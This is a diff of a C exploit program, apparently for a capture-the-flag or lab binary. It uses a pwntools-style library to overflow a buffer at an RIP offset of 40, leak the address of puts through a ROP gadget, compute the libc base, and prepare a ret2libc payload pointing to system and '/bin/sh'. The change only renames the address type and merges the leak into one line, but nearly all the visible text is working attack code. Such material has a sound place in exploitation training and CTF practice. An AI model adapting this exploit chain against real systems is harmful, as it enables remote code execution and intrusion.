@@ -8,17 +8,18 @@ int main() {
   p.log_level = 0;
 
   int rip_offset = 40;
-  uintptr_t ret = 0x40063e;
-  uintptr_t pop_rdi_ret = 0x4010a3;
 
-  uintptr_t puts_got = 0x601fa8;
-  uintptr_t puts_plt = 0x400650;
+  addr_t ret = 0x40063e;
+  addr_t pop_rdi_ret = 0x4010a3;
 
-  uintptr_t puts_libc = 0x000000000080aa0;
-  uintptr_t system_libc = 0x00000000004f550;
-  uintptr_t binsh_libc = 0x01b3e1a;
+  addr_t puts_got = 0x601fa8;
+  addr_t puts_plt = 0x400650;
 
-  uintptr_t main = 0x0000000000400f68;
+  addr_t puts_libc = 0x000000000080aa0;
+  addr_t system_libc = 0x00000000004f550;
+  addr_t binsh_libc = 0x01b3e1a;
+
+  addr_t main = 0x0000000000400f68;
 
   t_data payload = paw_init_data();
 
@@ -42,11 +43,8 @@ int main() {
   paw_recv(p, rip_offset);
 
   paw_recv(p, 3);
-  t_data leak = paw_recv(p, 6);
 
-
-  uintptr_t libc = paw_u64(leak);
-
+  addr_t libc = paw_u64(paw_recv(p, 6));
   libc -= puts_libc;
 
   t_data payload3 = paw_init_data();
